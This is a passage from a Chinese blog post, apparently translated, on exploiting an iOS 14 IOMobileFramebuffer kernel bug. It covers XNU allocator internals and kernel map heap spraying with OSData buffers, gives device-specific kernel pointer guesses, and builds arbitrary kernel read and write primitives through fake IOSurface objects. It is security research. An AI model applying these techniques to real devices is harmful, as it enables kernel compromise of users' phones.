z;</span><br><span class="line"></span><br><span class="line">    size = req_size;</span><br><span class="line"></span><br><span class="line">    z = <span class="built_in">kalloc_heap_zone_for_size</span>(kheap, size);</span><br><span class="line">    <span class="keyword">if</span> (__improbable(z == ZONE_NULL)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kalloc_large</span>(kheap, req_size, size, flags, site);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果传递给它的大小大于kalloc_max_prerounded，kalloc_heap_zone_for_size将返回ZONE_NULL。对于iOS 14.6和iOS 14.7，kalloc_max_prerounded是32769字节，因为任何kheap中最大的区域是用于分配高达32768字节的数据。因此，为了使kalloc_heap_zone_for_size返回ZONE_NULL并进入kalloc_large，我们只需要分配大于32768字节的东西。</p>
<p>下面是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L744">kalloc_large</a>部分代码:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((noinline))</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">kalloc_result</span></span><br><span class="line"><span class="built_in">kalloc_large</span>(</span><br><span class="line">    <span class="type">kalloc_heap_t</span>         kheap,</span><br><span class="line">    <span class="type">vm_size_t</span>             req_size,</span><br><span class="line">    <span class="type">vm_size_t</span>             size,</span><br><span class="line">    <span class="type">zalloc_flags_t</span>        flags,</span><br><span class="line">    <span class="type">vm_allocation_site_t</span>  *site)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> kma_flags = KMA_ATOMIC;</span><br><span class="line">    <span class="type">vm_tag_t</span> tag;</span><br><span class="line">    <span class="type">vm_map_t</span> alloc_map;</span><br><span class="line">    <span class="type">vm_offset_t</span> addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    size = <span class="built_in">round_page</span>(size);</span><br><span class="line"></span><br><span class="line">    alloc_map = <span class="built_in">kalloc_map_for_size</span>(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_map != kernel_map) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">                addr = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            addr = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> kalloc_result)&#123; .addr = (<span class="type">void</span> *)addr, .size = req_size &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L608">kalloc_map_for_size</a>只是根据大小来选择适当的地图进行分配。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">vm_map_t</span></span></span><br><span class="line"><span class="function"><span class="title">kalloc_map_for_size</span><span class="params">(<span class="type">vm_size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; kalloc_kernmap_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> kalloc_map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kernel_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在iPhone 8和iPhone SE上，kalloc_kernmap_size是0x100001字节。因此，通过调用大于32768字节的东西，我们可以忽略Kheap隔离和封存，并从kalloc地图或内核地图中进行分配。真是一种解脱……</p>
<p>kalloc_large调用kmem_alloc_flags，kmem_alloc_flags尾部调用kernel_memory_allocate。 kernel_memory_allocate通过调用vm_map_find_space在传递给它的vm_map中找到空间。真正重要的是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/vm/vm_map.c#L1731">vm_map_find_space</a>如何找到空闲内存。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">vm_map_find_space</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_t</span>                map,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_offset_t</span>         *address,       <span class="comment">/* OUT */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_size_t</span>           size,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_offset_t</span>         mask,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>                     flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_kernel_flags_t</span>   vmk_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_tag_t</span>                tag,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_entry_t</span>          *o_entry)</span>       <span class="comment">/* OUT */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">vm_map_entry_t</span>          entry, new_entry, hole_entry;</span><br><span class="line">    <span class="type">vm_map_offset_t</span>         start;</span><br><span class="line">    <span class="type">vm_map_offset_t</span>         end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    new_entry = <span class="built_in">vm_map_entry_create</span>(map, FALSE);</span><br><span class="line">    <span class="built_in">vm_map_lock</span>(map);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; VM_MAP_FIND_LAST_FREE) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (vmk_flags.vmkf_guard_after) &#123;</span><br><span class="line">            <span class="comment">/* account for the back guard page in the size */</span></span><br><span class="line">            size += <span class="built_in">VM_MAP_PAGE_SIZE</span>(map);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *  Look for the first possible address; if there&#x27;s already</span></span><br><span class="line"><span class="comment">         *  something at this address, we have to start after it.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>“寻找第一个可能的地址 “表明，如果我们在zone map之外进行大量分配，它们最终不仅会被连续布置，而且会按照我们分配的顺序布置。对我们来说，VM_MAP_FIND_LAST_FREE不会被设置为标志，因为那是专门为kheap区域分配新的虚拟内存的选项。</p>
<p>我们应该对内核喷洒什么呢？在Siguza的<a target="_blank" rel="noopener" href="https://blog.siguza.net/v0rtex/">v0rtex</a>的文章中，大于一页的OSData缓冲区会直接进入内核地图，但那是近四年前的事了。我自己检查了一下，看看从那时起是否有什么变化，在我的内核中追踪到OSData::initWithCapacity后，情况仍然如此。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">OSData::initWithCapacity_unsigned_int</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( page_size &gt; capacity )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">kalloc_ext</span>(&amp;KHEAP_DATA_BUFFERS, capacity, <span class="number">0LL</span>, &amp;unk_FFFFFFF009260880);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( capacity &lt; <span class="number">0xFFFFC001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (capacity + <span class="number">0x3FFF</span>) &amp; <span class="number">0xFFFFC000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">kernel_memory_allocate</span>(kernel_map, &amp;v11, v8, <span class="number">0LL</span>, <span class="number">0LL</span>, v9);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，只要我们的分配超过了一个页面，并且不是过分的大，我们就可以把受控的数据放入内核地图。而为了进行OSData分配，我们将利用<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/libkern/c%2B%2B/OSSerializeBinary.cpp#L355">OSUnserializeBinary</a>。这个函数已经存在很久很久了，这里有大量关于其输入数据格式的文档。IOSurfaceRootUserClient外部方法9，即IOSurfaceRootUserClient::s_set_value，使用OSUnserializeBinary来解析其结构输入数据，所以我们可以用它来进行分配。我们还可以用IOSurfaceRootUserClient::s_get_value读回数据，或者用IOSurfaceRootUserClient::s_remove_value释放数据。</p>
<p>喷洒500MB的OSData缓冲区，原因有二：第一，做500MB的分配不需要那么长的时间，第二，做那么多的分配，在某个时间点之后，几乎可以保证可预测和连续的分配。使用<a target="_blank" rel="noopener" href="https://github.com/jsherman212/xnuspy">xnuspy</a>，钩住kernel_memory_allocate，检查它是否被OSData::initWithCapacity调用。如果是的话，把它刚刚分配的页面的地址记录在一个全局数组中。由于xnuspy从可执行文件的<code>__TEXT</code>和<code>__DATA</code>段中创建了共享内存，对这个数组的写入对用户空间代码来说是可见的。喷洒结束后，对该数组内的分配进行了排序，并检查是否有任何漏洞。忽略前1000个分配，因为在那之后我们很有可能只看到连续的、按顺序的分配。如果没有漏洞，就记录下这个范围，在重启后再做几次，得出了iPhone 8的以下范围。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0xffffffe8cee1c000, 0xffffffe8ec458000)</span><br><span class="line">[0xffffffe8cef78000, 0xffffffe8ec5b0000)</span><br><span class="line">[0xffffffe8ce9b4000, 0xffffffe8ebff4000)</span><br><span class="line">[0xffffffe8cef38000, 0xffffffe8ec570000)</span><br><span class="line">[0xffffffe8cead4000, 0xffffffe8ec10c000)</span><br><span class="line">[0xffffffe8ccdec000, 0xffffffe8ec378000)</span><br></pre></td></tr></table></figure>

<p>算出每个范围的平均数，把它们加到一个列表中，然后取这个列表的平均数来得出我们猜测的内核map指针。对于运行iOS 14.6的iPhone 8来说，这个指针是0xffffffe8dd594000，而且出奇地可靠。但是，iOS 14.7的iPhone SE是另一个故事。那部手机的地址空间被诅咒了。不确定是什么原因导致了这种奇怪的现象，但还是能够得出一个猜测：0xfffff9942d0000。这个猜测有大约50%的成功率，而iPhone 8的猜测则倾向于90%。</p>
<p>你可以在这里找到kernel_memory_allocate的<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/main/kernel_hooks.c">钩子</a>，在这里找到<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/608471b6b649986cf411fce530ec3aa879c063cf/IOMobileFramebufferUserClient.c#L586">分析</a>全局数组的代码，在这里找到生成猜测的<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/main/alloc_averager.py">python</a>脚本。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Stage-0"><a href="#Stage-0" class="headerlink" title="Stage 0"></a>Stage 0</h2><p>有了一个用于32位增量的指针，我开始思考这个漏洞的最终目标是什么，因为它不会是一个假的内核任务端口。用一个假的IOSurface对象代替怎么样？如果IOSurface::increment_use_count在偏移量0xc0处读出一个指针来增加 “使用次数”，我想是否有一个IOSurfaceRootUserClient的外部方法来读取这个 “使用次数”……哦，看，有的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceRootUserClient::get_surface_use_count</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v6 = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="built_in">lck_mtx_lock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;m.surface_client_array_capacity &gt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = a1-&gt;m.surface_client_array[a2];</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        *a3 = IOSurfaceClient::<span class="built_in">get_use_count</span>(v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lck_mtx_unlock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceClient::get_use_count:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD __fastcall <span class="title">IOSurfaceClient::get_use_count</span><span class="params">(IOSurfaceClient *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> IOSurface::<span class="built_in">get_use_count</span>(a1-&gt;m.surface);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurface::get_use_count:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD __fastcall <span class="title">IOSurface::get_use_count</span><span class="params">(IOSurface *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_DWORD *)(a1-&gt;qwordC0 + <span class="number">0x14LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们控制一个IOSurface对象，我们就控制了内核指针的偏移量0xc0。因此，通过调用这个IOSurfaceRootUserClient::s_get_surface_use_count与一个被控制的IOSurface，我们会有一个任意的32位内核读取。但是一个任意的写呢？这个位于偏移量0xc0的指针似乎有很大的意义。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceRootUserClient::set_compressed_tile_data_region_memory_used_of_plane</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v8 = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="built_in">lck_mtx_lock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;m.surface_client_array_capacity &gt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = a1-&gt;m.surface_client_array[a2];</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">        v8 = IOSurfaceClient::<span class="built_in">setCompressedTileDataRegionMemoryUsageOfPlane</span>(v9, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lck_mtx_unlock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> IOSurface::<span class="built_in">setCompressedTileDataRegionMemoryUsedOfPlane</span>(a1-&gt;m.surface, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane</span><span class="params">(IOSurface *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">4</span> &amp;&amp; a1-&gt;dwordB0 &gt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    *(_DWORD *)(a1-&gt;qwordC0 + <span class="number">4LL</span> * a2 + <span class="number">0x98</span>) = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们同时控制了a2和a3，所以如果我们控制传递给这个函数的IOSurface对象，我们就有了一个任意的32位内核写入。</p>
<p>还记得每个IOSurfaceRootUserClient是如何跟踪它所拥有的IOSurface对象的吗？每一次从IOSurfaceClient数组中的读取都是在边界检查的保护下进行的。如果我们以某种方式泄露了我们拥有的IOSurfaceRootUserClient的地址，我们可以使用类型混淆的32位增量来提高其surface_client_array_capacity字段。这将人为地创造一个越过其surface_client_array末端的越界读取，所以我们可以索引到一个我们控制的缓冲区。</p>
<p>因此，这个漏洞的目标是构建一个假的IOSurfaceClient对象（它将携带一个指向假的IOSurface对象的指针），我们可以使用IOSurfaceRootUserClient外部方法对其进行索引。</p>
<h2 id="Stage-1-塑形内核VA"><a href="#Stage-1-塑形内核VA" class="headerlink" title="Stage 1: 塑形内核VA"></a>Stage 1: 塑形内核VA</h2><p>第一阶段的目标是创建一个可预测的大型IOSurfaceClient数组的布局，并控制缓冲区极其接近OSData缓冲区，该缓冲区与我们猜测的内核指针相对应。很明显，我们需要在其他事情之前找到这个OSData缓冲区。选择0x10000字节的分配对内核map喷洒500MB数据，因为我们将在喷射IOSurfaceClient数组时使用这个大小。这个大小是任意选择的，没有什么意义。然而，根据特定启动的内核map碎片，猜测不会总是落在0x10000字节的OSData缓冲区的第一页。因此，对于每个OSData缓冲区的每一页。</p>
<ul>
<li>偏移量0x0保持一个常数。</li>
<li>偏移量0X4保存页面编号。</li>
<li>偏移量0x8持有用于IOSurfaceRootUserClient外部方法9、10和11的密钥。</li>
</ul>
<p>在500MB被喷完后，猜测的内核指针被使用，并有32位增量。如果猜测落在一个未映射的页面上，就会导致Panic，但如果它落在我们的一个已喷涂的缓冲区上，那么这些页面开始的那个常量值就会被递增了。我们用IOSurfaceRootUserClient::s_get_value读回所有的OSData缓冲区，并检查这个变化。一旦我们找到被写入的缓冲区的页面，我们就用偏移量0x4的页码来计算第一个页面的地址。</p>
<p>从现在开始，将把与我们猜测的内核指针相对应的OSData缓冲区称为 “锚点分配”。</p>
<p>我们现在处于一个非常好的位置。我们知道锚点分配在内核内存中的地址，并且由于vm_map_find_space的可预测性，这些OSData缓冲区极有可能按照它们被分配的顺序排列。这就是在这个漏洞中最依赖的东西。因为知道锚点分配的地址，所以知道与它相邻的所有OSData缓冲区的地址。如果想要左边的第n个OSData缓冲区，那么就从锚点分配的地址中减去<code>0x10000*n</code>字节。如果我想把第n个OSData缓冲区放在右边，那么我就把<code>0x10000*n</code>字节加到锚点分配的地址上。</p>
<p>此外，如果我们释放了一个OSData缓冲区，我们应该能够很容易地收回那个缓冲区，因为vm_map_find_space的 “寻找第一个可能的地址  “的思想。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_fig1.png"></p>
<p>如果逆向过IOSurface kext，或者看过内核日志，可能知道每个IOSurfaceRootUserClient有4096个IOSurface对象的限制。一旦我们达到了一个IOSurfaceRootUserClient的限制，我们就可以创建另一个，并继续用新的IOSurface对象。同样，对于我们创建的每一个IOSurface对象，都会有一个IOSurfaceClient对象。但是，即使我们创建了4096个IOSurface对象，sizeof(IOSurfaceClient *) * 4096也只有0x8000字节，而不是0x10000字节。那么是什么原因呢？</p>
<p>原因在IOSurfaceRootUserClient::alloc_handles里:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IOSurfaceRootUserClient::alloc_handles</span><span class="params">(IOSurfaceRootUserClient *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity;</span><br><span class="line">  surface_client_array = a1-&gt;m.surface_client_array;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">IONewZero</span>(<span class="number">8</span> * surface_client_array_capacity);</span><br><span class="line">  a1-&gt;m.surface_client_array = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;m.surface_client_array_capacity = surface_client_array_capacity;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceRootUserClient::set_surface_handle是由IOSurfaceClient::init调用的，所以每次我们创建一个新的IOSurface对象时都会到达IOSurfaceRootUserClient::alloc_handles。</p>
<p>正是这一行使0x10000字节的IOSurfaceClient阵列成为可能:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity;</span><br></pre></td></tr></table></figure>

<p>provider字段指向一个IOSurfaceRoot对象。创建的每个IOSurfaceRootUserClient对象都有相同的provider指针。那么，在创建一个新的IOSurface时，IOSurfaceRoot是如何发挥作用的？当你创建一个IOSurface时，首先要调用的一个函数是IOSurface::init。为了分配一个新的IOSurface ID，它调用IOSurfaceRoot::alloc_surfaceid。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOSurfaceRoot::alloc_surfaceid</span><span class="params">(IOSurfaceRoot *a1, <span class="type">unsigned</span> <span class="type">int</span> *new_surface_idp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v4 = a1-&gt;m.total_surfaces_created &gt;&gt; <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &gt;= a1-&gt;m.surface_client_array_capacity &gt;&gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="keyword">if</span> ( (IOSurfaceRoot::<span class="built_in">alloc_handles</span>(a1) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span 